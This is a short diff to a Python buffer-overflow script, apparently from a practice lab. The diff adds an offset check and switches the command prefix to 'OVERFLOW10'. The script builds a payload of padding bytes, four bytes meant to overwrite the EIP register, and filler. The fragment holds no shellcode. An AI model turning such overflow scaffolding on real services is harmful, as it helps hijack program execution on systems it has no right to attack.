@@ -8,8 +8,12 @@ import itertools
 from typing import Optional
 
 def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
+	if eip_offset > overflow_threshold:
+		print("The value of the offset cannot be bigger than the overflow threshold")
+		sys.exit(0)
+
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW2 "	
+	prefix = b"OVERFLOW10 "	# CHANGE
 	buffer = b"A" * eip_offset
 	eip = b"B" * 4
 	suffix = b"C" * (overflow_threshold - eip_offset - len(eip))
